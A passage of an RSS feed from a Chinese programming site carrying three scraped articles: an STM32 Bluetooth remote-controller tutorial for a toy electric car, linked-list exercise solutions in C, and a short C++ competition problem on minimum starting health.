      <description>首页编程日记开发工具嵌入式服务器运维基于STM32的电动汽车遥控器设计news/2025/10/31 17:53:35/引言本项目设计了一个基于STM32的电动汽车遥控器，能够通过无线通信（如蓝牙或射频模块）控制电动汽车的前进、后退、左右转向等动作。该遥控器采用按键或摇杆操作，并通过无线模块将控制指令发送给汽车控制端，实现远程操作。系统适用于玩具电动汽车、无人驾驶车辆的遥控控制等场景。环境准备1. 硬件设备STM32F103C8T6 开发板（或其他 STM32 系列）蓝牙模块（如 HC-05 或 HC-06，用于无线通信）或射频模块（如 NRF24L01，用于无线通信）摇杆模块（或多个按键，用于方向控制）OLED 显示屏（用于显示当前控制状态）电动汽车控制器端（电机驱动模块、电机等）USB-TTL 串口调试工具电阻、杜邦线、面包板等基础电子元件2. 软件工具STM32CubeMX：用于初始化 STM32 外设。Keil uVision 或 STM32CubeIDE：用于编写和下载代码。ST-Link 驱动程序：用于下载程序到 STM32。项目实现1. 硬件连接摇杆模块或按键连接：将摇杆的 X 和 Y 轴输出引脚分别连接到 STM32 的 ADC 输入引脚（如 PA0 和 PA1），用于检测方向；若使用按键，将按键的数字输出引脚连接到 STM32 的 GPIO（如 PA2~PA5）。蓝牙模块连接：将蓝牙模块的 TX/RX 引脚分别连接到 STM32 的 USART RX/TX 引脚（如 PA9 和 PA10），用于实现无线通信。OLED 显示屏连接：将 OLED 的 SDA 和 SCL 引脚连接到 STM32 的 I2C 接口（如 PB6 和 PB7），用于显示当前遥控状态。其他连接：为 STM32、摇杆、蓝牙模块、显示屏提供适当的电源，并确保信号线接线正确。2. STM32CubeMX 配置打开 STM32CubeMX，选择你的开发板型号。配置系统时钟为 HSI，确保系统稳定运行。配置 GPIO 用于检测按键输入或读取摇杆数据。配置 USART，用于与蓝牙模块通信。配置 ADC，用于读取摇杆的模拟信号。配置 I2C，用于与 OLED 显示屏通信。生成代码，选择 Keil 或 STM32CubeIDE 作为工具链。3. 编写主程序在生成的项目基础上，编写按键或摇杆控制逻辑、无线通信发送、OLED显示和电动汽车控制指令的代码。以下是电动汽车遥控器的基本代码示例：#include "stm32f1xx_hal.h"
#include "oled.h"
#include "bluetooth.h"
#include "adc.h"
#include "gpio.h"// 定义控制参数
#define JOYSTICK_THRESHOLD_HIGH 3000  // 摇杆高阈值
#define JOYSTICK_THRESHOLD_LOW 1000   // 摇杆低阈值// 电动汽车的控制命令
#define CAR_FORWARD  0x01
#define CAR_BACKWARD 0x02
#define CAR_LEFT     0x03
#define CAR_RIGHT    0x04
#define CAR_STOP     0x00// 函数声明
void System_Init(void);
void Control_Joystick(void);
void Control_Button(void);
void Send_Car_Command(uint8_t command);
void Display_Status(const char* status);// 全局变量
uint32_t joystick_x = 0, joystick_y = 0;  // 摇杆数据
uint8_t current_command = CAR_STOP;       // 当前发送的命令void System_Init(void)
{HAL_Init();SystemClock_Config();MX_GPIO_Init();MX_ADC1_Init();MX_I2C1_Init();MX_USART1_UART_Init();OLED_Init();Bluetooth_Init();OLED_ShowString(0, 0, "Car Remote Ready");
}// 使用摇杆控制
void Control_Joystick(void)
{joystick_x = HAL_ADC_GetValue(&amp;hadc1);  // 读取摇杆 X 轴值joystick_y = HAL_ADC_GetValue(&amp;hadc2);  // 读取摇杆 Y 轴值if (joystick_y &gt; JOYSTICK_THRESHOLD_HIGH){Send_Car_Command(CAR_FORWARD);  // 前进Display_Status("Forward");}else if (joystick_y &lt; JOYSTICK_THRESHOLD_LOW){Send_Car_Command(CAR_BACKWARD);  // 后退Display_Status("Backward");}else if (joystick_x &gt; JOYSTICK_THRESHOLD_HIGH){Send_Car_Command(CAR_RIGHT);  // 右转Display_Status("Right");}else if (joystick_x &lt; JOYSTICK_THRESHOLD_LOW){Send_Car_Command(CAR_LEFT);  // 左转Display_Status("Left");}else{Send_Car_Command(CAR_STOP);  // 停止Display_Status("Stop");}
}// 使用按键控制
void Control_Button(void)
{if (HAL_GPIO_ReadPin(GPIOA, GPIO_PIN_2) == GPIO_PIN_SET){Send_Car_Command(CAR_FORWARD);  // 前进Display_Status("Forward");}else if (HAL_GPIO_ReadPin(GPIOA, GPIO_PIN_3) == GPIO_PIN_SET){Send_Car_Command(CAR_BACKWARD);  // 后退Display_Status("Backward");}else if (HAL_GPIO_ReadPin(GPIOA, GPIO_PIN_4) == GPIO_PIN_SET){Send_Car_Command(CAR_LEFT);  // 左转Display_Status("Left");}else if (HAL_GPIO_ReadPin(GPIOA, GPIO_PIN_5) == GPIO_PIN_SET){Send_Car_Command(CAR_RIGHT);  // 右转Display_Status("Right");}else{Send_Car_Command(CAR_STOP);  // 停止Display_Status("Stop");}
}// 发送控制命令给电动汽车
void Send_Car_Command(uint8_t command)
{Bluetooth_Send(command);  // 通过蓝牙发送控制指令current_command = command;
}// 显示控制状态
void Display_Status(const char* status)
{OLED_Clear();OLED_ShowString(0, 0, status);  // 显示当前控制状态
}int main(void)
{System_Init();while (1){Control_Joystick();  // 使用摇杆控制（或选择Control_Button）HAL_Delay(100);      // 每100毫秒发送一次控制信号}
}4. 各模块代码摇杆或按键控制通过读取摇杆的ADC值或按键的GPIO输入，来判断方向控制：#include "adc.h"
#include "gpio.h"// 初始化摇杆和按键
void Joystick_Init(void)
{// 配置 ADC，用于读取摇杆的 X 和 Y 轴数据MX_ADC1_Init();
}void Button_Init(void)
{// 配置 GPIO，用于检测按键的数字信号MX_GPIO_Init();
}// 读取摇杆值，判断控制方向
void Read_Joystick(uint32_t* x, uint32_t* y)
{*x = HAL_ADC_GetValue(&amp;hadc1);  // 读取 X 轴数据*y = HAL_ADC_GetValue(&amp;hadc2);  // 读取 Y 轴数据
}蓝牙通信通过蓝牙模块发送电动汽车的控制指令：#include "bluetooth.h"// 初始化蓝牙模块
void Bluetooth_Init(void)
{// 配置 USART，初始化蓝牙模块
}// 发送控制指令
void Bluetooth_Send(uint8_t command)
{// 通过 USART 发送控制指令到蓝牙模块HAL_UART_Transmit(&amp;huart1, &amp;command, 1, 1000);
}OLED 显示OLED 显示屏用于显示当前控制状态：#include "oled.h"// 初始化 OLED 显示屏
void OLED_Init(void)
{// OLED 初始化代码
}// 显示字符串
void OLED_ShowString(uint8_t x, uint8_t y, const char *str)
{// 在 OLED 显示屏上显示字符串
}// 清屏
void OLED_Clear(void)
{// 清除 OLED 显示内容
}⬇帮大家整理了单片机的资料包括stm32的项目合集【源码+开发文档】点击下方蓝字即可领取，感谢支持！⬇点击领取更多嵌入式详细资料问题讨论，stm32的资料领取可以私信！系统工作原理摇杆或按键控制：系统通过摇杆或按键的输入信号检测骑行者的方向指令。摇杆的 X 轴和 Y 轴对应控制左右转向和前进后退，按键则对应固定的前进、后退、左转和右转操作。蓝牙通信：通过蓝牙模块将控制指令发送给电动汽车接收端。电动汽车接收指令后，根据命令执行相应的运动操作，如前进、后退、左转和右转。状态显示：OLED 显示屏实时显示当前的控制状态（如前进、后退等），让用户随时了解控制情况。常见问题与解决方法1.遥控不灵敏问题原因：摇杆或按键检测灵敏度不足，或蓝牙通信延迟较大。解决方法：优化摇杆和按键的阈值判断，并检查蓝牙模块的信号强度和通信频率。2.蓝牙通信不稳定问题原因：蓝牙信号受到干扰或模块连接不稳定。解决方法：确保蓝牙模块与STM32的连接稳定，避免金属或其他无线设备对蓝牙信号的干扰。3.OLED 显示异常问题原因：I2C 通信错误或 OLED 显示模块故障。解决方法：检查 I2C 连接是否牢固，并确保 OLED 模块初始化正确。扩展功能语音控制：可以集成语音识别模块，通过语音命令控制电动汽车，实现更加智能的遥控体验。自动避障功能：通过增加超声波或红外传感器，电动汽车可以实现自动避障功能，避免与障碍物碰撞。数据记录和传输：通过蓝牙或 Wi-Fi 模块，将遥控数据或行驶数据上传到手机APP或云端进行监控和分析。结论通过本项目，我们设计了一个基于STM32的电动汽车遥控器，能够通过摇杆或按键发出前进、后退、左右转向的控制指令，并通过蓝牙无线传输到电动汽车端。系统集成了手动控制、无线通信、状态显示等功能，适用于玩具电动汽车和自动驾驶测试车辆的远程控制。未来可以通过语音控制、自动避障等功能扩展系统的智能化和应用范围。http://www.ppmy.cn/news/1540398.html相关文章数据结构练习题4(链表)1两两交换链表中的节点 
给你一个链表&amp;#xff0c;两两交换其中相邻的节点&amp;#xff0c;并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题&amp;#xff08;即&amp;#xff0c;只能进行节点交换&amp;#xff09;。 示例 1&amp;#xff1a; 输入&amp;#xff1a;head  [1,2,3,4]…阅读更多...上海市计算机学会竞赛平台2024年10月月赛丙组游戏闯关题目描述 
小爱现在想要通关一个游戏&amp;#xff0c;已知这个游戏主角的生命值没有上限&amp;#xff0c;但当游戏过程中任意时刻一旦生命值小于等于零、则游戏会结束。 
已知该游戏共有 nn 的关卡&amp;#xff0c;第 ii 个关卡有一个参数 aiai​&amp;#xff0c;当 ai&gt;0ai​&gt;0 时表示小爱…阅读更多...Spring Boot技术栈在电影评论网站中的应用2相关技术 
2.1 MYSQL数据库 MySQL是一个真正的多用户、多线程SQL数据库服务器。 是基于SQL的客户/服务器模式的关系数据库管理系统&amp;#xff0c;它的有点有有功能强大、使用简单、管理方便、安全可靠性高、运行速度快、多线程、跨平台性、完全网络化、稳定性等&amp;#xff0c;非常…阅读更多...使用短效IP池的优势是什么？短效IP池作为代理IP服务中一种独特的资源管理方式&amp;#xff0c;其应用已经在数据采集、市场分析和网络安全等多个领域中展示出强大的功能。尽管“短效”听起来似乎意味着某种限制&amp;#xff0c;然而在某些特定的应用场景下&amp;#xff0c;短效IP池却提供了无可比拟的优势。本文将详细…阅读更多...C++ 模板（基础）前言&amp;#xff1a; 
C 中的模板是一个强大的功能&amp;#xff0c;允许程序员编写通用的代码&amp;#xff0c;这些代码可以处理任何数据类型。模板使得代码更加灵活和可重用&amp;#xff0c;而不必为每种数据类型编写重复的代码。下面详细解释 C 中的模板 
内容摘要&amp;#xff1a; 
本文内容包含…阅读更多...8-基于双TMS320C6678 + XC7K420T的6U CPCI Express高速数据处理平台1、板卡概述 板卡由我公司自主研发&amp;#xff0c;基于6UCPCI架构&amp;#xff0c;处理板包含双片TI DSP TMS320C6678芯片&amp;#xff1b;一片Xilinx公司FPGA XC7K420T-1FFG1156 芯片&amp;#xff1b;六个千兆网口&amp;#xff08;FPGA两个&amp;#xff0c;DSP四个&amp;#xff09;&amp;#xff1b;DSP与FPGA之…阅读更多...VS Code开发qt项目没整明白&amp;#xff0c;尴尬  安装扩展  设置cmake路径 前提是已经安装了QT 报错  用msvc选windows启动&amp;#xff0c;用mingw则选gdb启动阅读更多...php之is_null、empty 、isset 的区别目录 
1.isset()&amp;#xff1a; 
2.empty()&amp;#xff1a; 
3.is_null&amp;#xff1a; 
4.总结&amp;#xff1a; 在PHP中&amp;#xff0c;is_null、empty 和 isset 是三个用于检查变量状态的常用函数&amp;#xff0c;它们各自有不同的用途和行为&amp;#xff1a; 
1.isset()&amp;#xff1a; 
isset() 函数…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:35 +0000</pubDate>
    </item>
    <item>
      <title>数据结构练习题4(链表)</title>
      <link>https://www.ppmy.cn/news/1540397.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维数据结构练习题4(链表)news/2025/10/31 17:53:34/1两两交换链表中的节点给你一个链表，两两交换其中相邻的节点，并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题（即，只能进行节点交换）。示例 1：输入：head = [1,2,3,4]输出：[2,1,4,3]示例 2：输入：head = []输出：[]示例 3：输入：head = [1]输出：[1]提示：链表中节点的数目在范围[0, 100]内0 &lt;= Node.val &lt;= 100思路：初始检查：如果链表为空或只有一个节点，直接返回。创建虚拟头节点：使用一个虚拟头节点 dummy 来简化边界情况的处理。循环交换节点对：在链表中继续交换每一对节点，直到没有更多的节点对（cur-&gt;next &amp;&amp; cur-&gt;next-&gt;next 都不为空时）可以交换。开始时cur为与虚拟头结点位置步骤一：cur-&gt;next 指向第二个节点。步骤二：第二个节点的 next 指向第一个节点。步骤三：第一个节点的 next 指向第三个节点。移动到下一对节点的前一个节点：将 cur 移动到下一对节点的前一个节点。代码：struct ListNode* swapPairs(struct ListNode* head) {// 如果链表为空或只有一个节点，直接返回if (!head || !head-&gt;next) return head;struct ListNode dummy;  // 创建一个虚拟头节点dummy.next = head;struct ListNode* cur = &amp;dummy;while (cur-&gt;next &amp;&amp; cur-&gt;next-&gt;next) {struct ListNode* tmp = cur-&gt;next;         // 保存第一个节点struct ListNode* tmp1 = cur-&gt;next-&gt;next-&gt;next;  // 保存第二个节点的下一个节点cur-&gt;next = cur-&gt;next-&gt;next;    // 步骤一：cur-&gt;next 指向第二个节点cur-&gt;next-&gt;next = tmp;          // 步骤二：第二个节点的 next 指向第一个节点cur-&gt;next-&gt;next-&gt;next = tmp1;   // 步骤三：第一个节点的 next 指向第三个节点cur = cur-&gt;next-&gt;next;  // 移动到下一对节点的前一个节点}return dummy.next;  // 返回新的头节点
}2删除链表的倒数第 N 个结点给你一个链表，删除链表的倒数第n个结点，并且返回链表的头结点。示例 1：输入：head = [1,2,3,4,5], n = 2输出：[1,2,3,5]示例 2：输入：head = [1], n = 1输出：[]示例 3：输入：head = [1,2], n = 1输出：[1]提示：链表中结点的数目为sz1 &lt;= sz &lt;= 300 &lt;= Node.val &lt;= 1001 &lt;= n &lt;= sz思路：创建虚拟头节点：使用malloc分配内存并创建一个虚拟头节点dummy，其val为 0，next指向实际的头节点head。初始化快慢指针：fast和slow都指向虚拟头节点。快指针先移动 n 步：通过循环，让fast指针先移动n步。快指针再移动一步：因为需要让slow指向删除节点的上一个节点同时移动快慢指针：继续移动fast和slow指针，直到fast指针到达链表末尾。此时，slow指针指向的节点就是要删除的节点的前一个节点。删除节点：将slow的next指向slow-&gt;next-&gt;next，从而删除目标节点。更新头节点：将head更新为dummy-&gt;next。释放虚拟头节点：使用free释放虚拟头节点的内存空间。返回头节点：返回更新后的头节点head。代码：/*** Definition for singly-linked list.* struct ListNode {*     int val;*     struct ListNode *next;* };*/
struct ListNode* removeNthFromEnd(struct ListNode* head, int n) {// 创建一个虚拟头节点，并初始化其值为0，next指向实际的头节点struct ListNode* dummy = malloc(sizeof(struct ListNode));dummy-&gt;val = 0;dummy-&gt;next = head;// 初始化快慢指针，都指向虚拟头节点struct ListNode* fast = dummy;struct ListNode* slow = dummy;// 快指针先向前移动n步for (int i = 0; i &lt; n; i++) {fast = fast-&gt;next;}// fast再提前走一步，因为需要让slow指向删除节点的上一个节点fast = fast-&gt;next;// 快慢指针同时移动，直到快指针到达链表末尾while (fast) {fast = fast-&gt;next;slow = slow-&gt;next;}// 删除慢指针的下一个节点（即倒数第n个节点）slow-&gt;next = slow-&gt;next-&gt;next;// 更新头节点（dummy是虚拟头节点，删除操作不会影响head）head = dummy-&gt;next;// 释放虚拟头节点的内存（注意：这里应该释放dummy，而不是释放dummy-&gt;next，因为dummy-&gt;next是实际的链表节点）free(dummy);// 返回更新后的头节点return head;
}3链表相交给你两个单链表的头节点headA和headB，请你找出并返回两个单链表相交的起始节点。如果两个链表没有交点，返回null。图示两个链表在节点c1开始相交：题目数据保证整个链式结构中不存在环。注意，函数返回结果后，链表必须保持其原始结构。示例 1：输入：intersectVal = 8, listA = [4,1,8,4,5], listB = [5,0,1,8,4,5], skipA = 2, skipB = 3输出：Intersected at '8'解释：相交节点的值为 8 （注意，如果两个链表相交则不能为 0）。
从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,0,1,8,4,5]。
在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。示例 2：输入：intersectVal = 2, listA = [0,9,1,2,4], listB = [3,2,4], skipA = 3, skipB = 1输出：Intersected at '2'解释：相交节点的值为 2 （注意，如果两个链表相交则不能为 0）。
从各自的表头开始算起，链表 A 为 [0,9,1,2,4]，链表 B 为 [3,2,4]。
在 A 中，相交节点前有 3 个节点；在 B 中，相交节点前有 1 个节点。示例 3：输入：intersectVal = 0, listA = [2,6,4], listB = [1,5], skipA = 3, skipB = 2输出：null解释：从各自的表头开始算起，链表 A 为 [2,6,4]，链表 B 为 [1,5]。
由于这两个链表不相交，所以 intersectVal 必须为 0，而 skipA 和 skipB 可以是任意值。
这两个链表不相交，因此返回 null 。提示：listA中节点数目为mlistB中节点数目为n0 &lt;= m, n &lt;= 3 * 1041 &lt;= Node.val &lt;= 1050 &lt;= skipA &lt;= m0 &lt;= skipB &lt;= n如果listA和listB没有交点，intersectVal为0如果listA和listB有交点，intersectVal == listA[skipA + 1] == listB[skipB + 1]思路：初始化变量：定义longList和shortList用于存储长链表和短链表的头节点，lenA和lenB用于存储两个链表的长度，gap用于存储长度差。计算链表长度：通过遍历链表headA和headB，分别计算它们的长度lenA和lenB。确定长链表和短链表：通过比较lenA和lenB，确定哪个是长链表，哪个是短链表，并计算长度差gap。尾部对齐：将长链表longList移动gap步，使得两个链表的尾部对齐。同时移动并检查交点：同时移动longList和shortList，检查是否有相同的节点。如果找到相同的节点，则返回该节点（即交点）。返回结果：如果没有找到交点，则返回NULL。代码：struct ListNode *getIntersectionNode(struct ListNode *headA, struct ListNode *headB) {struct ListNode *longList = NULL, *shortList = NULL;int lenA = 0, lenB = 0, gap = 0;// 求出两个链表的长度shortList = headA;while (shortList) {lenA++;shortList = shortList-&gt;next;}shortList = headB;while (shortList) {lenB++;shortList = shortList-&gt;next;}// 确定长链表和短链表，并计算长度差if (lenA &gt; lenB) {longList = headA;shortList = headB;gap = lenA - lenB;} else {longList = headB;shortList = headA;gap = lenB - lenA;}// 将长链表和短链表的尾部对齐while (gap--) {longList = longList-&gt;next;}// 同时移动长链表和短链表，检查是否有相同的节点while (longList) {if (longList == shortList) return longList; // 找到交点longList = longList-&gt;next;shortList = shortList-&gt;next;}// 没有找到交点return NULL;
}http://www.ppmy.cn/news/1540397.html相关文章上海市计算机学会竞赛平台2024年10月月赛丙组游戏闯关题目描述 
小爱现在想要通关一个游戏&amp;#xff0c;已知这个游戏主角的生命值没有上限&amp;#xff0c;但当游戏过程中任意时刻一旦生命值小于等于零、则游戏会结束。 
已知该游戏共有 nn 的关卡&amp;#xff0c;第 ii 个关卡有一个参数 aiai​&amp;#xff0c;当 ai&gt;0ai​&gt;0 时表示小爱…阅读更多...Spring Boot技术栈在电影评论网站中的应用2相关技术 
2.1 MYSQL数据库 MySQL是一个真正的多用户、多线程SQL数据库服务器。 是基于SQL的客户/服务器模式的关系数据库管理系统&amp;#xff0c;它的有点有有功能强大、使用简单、管理方便、安全可靠性高、运行速度快、多线程、跨平台性、完全网络化、稳定性等&amp;#xff0c;非常…阅读更多...使用短效IP池的优势是什么？短效IP池作为代理IP服务中一种独特的资源管理方式&amp;#xff0c;其应用已经在数据采集、市场分析和网络安全等多个领域中展示出强大的功能。尽管“短效”听起来似乎意味着某种限制&amp;#xff0c;然而在某些特定的应用场景下&amp;#xff0c;短效IP池却提供了无可比拟的优势。本文将详细…阅读更多...C++ 模板（基础）前言&amp;#xff1a; 
C 中的模板是一个强大的功能&amp;#xff0c;允许程序员编写通用的代码&amp;#xff0c;这些代码可以处理任何数据类型。模板使得代码更加灵活和可重用&amp;#xff0c;而不必为每种数据类型编写重复的代码。下面详细解释 C 中的模板 
内容摘要&amp;#xff1a; 
本文内容包含…阅读更多...8-基于双TMS320C6678 + XC7K420T的6U CPCI Express高速数据处理平台1、板卡概述 板卡由我公司自主研发&amp;#xff0c;基于6UCPCI架构&amp;#xff0c;处理板包含双片TI DSP TMS320C6678芯片&amp;#xff1b;一片Xilinx公司FPGA XC7K420T-1FFG1156 芯片&amp;#xff1b;六个千兆网口&amp;#xff08;FPGA两个&amp;#xff0c;DSP四个&amp;#xff09;&amp;#xff1b;DSP与FPGA之…阅读更多...VS Code开发qt项目没整明白&amp;#xff0c;尴尬  安装扩展  设置cmake路径 前提是已经安装了QT 报错  用msvc选windows启动&amp;#xff0c;用mingw则选gdb启动阅读更多...php之is_null、empty 、isset 的区别目录 
1.isset()&amp;#xff1a; 
2.empty()&amp;#xff1a; 
3.is_null&amp;#xff1a; 
4.总结&amp;#xff1a; 在PHP中&amp;#xff0c;is_null、empty 和 isset 是三个用于检查变量状态的常用函数&amp;#xff0c;它们各自有不同的用途和行为&amp;#xff1a; 
1.isset()&amp;#xff1a; 
isset() 函数…阅读更多...MySQL 查找连续相同名称的记录组，并保留每组内时间最大的一条记录要求&amp;#xff1a;查找连续相同名称的记录组&amp;#xff0c;并保留每组内时间最大的一条记录&amp;#xff0c;同时计算每组记录的 num 总和。 今天有人问了我一个问题&amp;#xff0c;大致就是下面这样的数据结构&amp;#xff08;原谅我实在不知道怎么描述这个问题&amp;#xff09; 然后需要得到下面…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:35 +0000</pubDate>
    </item>
    <item>
      <title>上海市计算机学会竞赛平台2024年10月月赛丙组游戏闯关</title>
      <link>https://www.ppmy.cn/news/1540396.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维上海市计算机学会竞赛平台2024年10月月赛丙组游戏闯关news/2025/10/31 17:53:34/题目描述小爱现在想要通关一个游戏，已知这个游戏主角的生命值没有上限，但当游戏过程中任意时刻一旦生命值小于等于零、则游戏会结束。已知该游戏共有 nn 的关卡，第 ii 个关卡有一个参数 aiai​，当 ai&gt;0ai​&gt;0 时表示小爱在通过此关卡时，会补充 aiai​ 点生命值；当 ai&lt;0ai​&lt;0 时表示小爱在通过此关卡时，会损失 aiai​ 点生命值；当 ai=0ai​=0 时表示小爱在通过此关卡时，不会有生命值的改变。请问，小爱最少在初始时最少需要拥有多少点生命，才能顺利通关？输入格式输入共两行：第一行，一个正整数表示关卡数 nn第二行，nn 个整数，表示a1,...,ana1​,...,an​输出格式输出共一行，一个整数表示答案数据范围对于 30%30% 的数据，1≤n≤201≤n≤20；对于 60%60% 的数据，1≤n≤1031≤n≤103；对于 100%100% 的数据，1≤n≤1051≤n≤105，−103≤ai≤103−103≤ai​≤103。样例数据输入:34 -7 2输出:4输入:31 0 1输出:1说明:不能出现生命值为0，因此初始状态也需要1点生命值详见代码:#include &lt;bits/stdc++.h&gt;
using namespace std;
int main() 
{int n;cin &gt;&gt; n;int sum = 0;int ans = 0;for(int i = 1; i &lt;= n; i++){int a;cin &gt;&gt; a;sum += a;ans = min(ans, sum);}cout &lt;&lt; 1 - ans ;return 0;
}http://www.ppmy.cn/news/1540396.html相关文章Spring Boot技术栈在电影评论网站中的应用2相关技术 
2.1 MYSQL数据库 MySQL是一个真正的多用户、多线程SQL数据库服务器。 是基于SQL的客户/服务器模式的关系数据库管理系统&amp;#xff0c;它的有点有有功能强大、使用简单、管理方便、安全可靠性高、运行速度快、多线程、跨平台性、完全网络化、稳定性等&amp;#xff0c;非常…阅读更多...使用短效IP池的优势是什么？短效IP池作为代理IP服务中一种独特的资源管理方式&amp;#xff0c;其应用已经在数据采集、市场分析和网络安全等多个领域中展示出强大的功能。尽管“短效”听起来似乎意味着某种限制&amp;#xff0c;然而在某些特定的应用场景下&amp;#xff0c;短效IP池却提供了无可比拟的优势。本文将详细…阅读更多...C++ 模板（基础）前言&amp;#xff1a; 
C 中的模板是一个强大的功能&amp;#xff0c;允许程序员编写通用的代码&amp;#xff0c;这些代码可以处理任何数据类型。模板使得代码更加灵活和可重用&amp;#xff0c;而不必为每种数据类型编写重复的代码。下面详细解释 C 中的模板 
内容摘要&amp;#xff1a; 
本文内容包含…阅读更多...8-基于双TMS320C6678 + XC7K420T的6U CPCI Express高速数据处理平台1、板卡概述 板卡由我公司自主研发&amp;#xff0c;基于6UCPCI架构&amp;#xff0c;处理板包含双片TI DSP TMS320C6678芯片&amp;#xff1b;一片Xilinx公司FPGA XC7K420T-1FFG1156 芯片&amp;#xff1b;六个千兆网口&amp;#xff08;FPGA两个&amp;#xff0c;DSP四个&amp;#xff09;&amp;#xff1b;DSP与FPGA之…阅读更多...VS Code开发qt项目没整明白&amp;#xff0c;尴尬  安装扩展  设置cmake路径 前提是已经安装了QT 报错  用msvc选windows启动&amp;#xff0c;用mingw则选gdb启动阅读更多...php之is_null、empty 、isset 的区别目录 
1.isset()&amp;#xff1a; 
2.empty()&amp;#xff1a; 
3.is_null&amp;#xff1a; 
4.总结&amp;#xff1a; 在PHP中&amp;#xff0c;is_null、empty 和 isset 是三个用于检查变量状态的常用函数&amp;#xff0c;它们各自有不同的用途和行为&amp;#xff1a; 
1.isset()&amp;#xff1a; 
isset() 函数…阅读更多...MySQL 查找连续相同名称的记录组，并保留每组内时间最大的一条记录要求&amp;#xff1a;查找连续相同名称的记录组&amp;#xff0c;并保留每组内时间最大的一条记录&amp;#xff0c;同时计算每组记录的 num 总和。 今天有人问了我一个问题&amp;#xff0c;大致就是下面这样的数据结构&amp;#xff08;原谅我实在不知道怎么描述这个问题&amp;#xff09; 然后需要得到下面…阅读更多...[k8s理论知识]3.docker基础（二）隔离技术容器其实是一种沙盒技术&amp;#xff0c;其核心是通过约束和修改进程的动态表现&amp;#xff0c;为其创建一个边界。这个边界确保了应用与应用之间不会相互干扰&amp;#xff0c;同时可以方便在不同的环境中迁移&amp;#xff0c;这是PaaS最理想的状态。 
程序是代码的可执行镜像&amp;#xff0c;通常…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:34 +0000</pubDate>
    </item>
    <item>
      <title>Spring Boot技术栈在电影评论网站中的应用</title>
      <link>https://www.ppmy.cn/news/1540395.html</link>
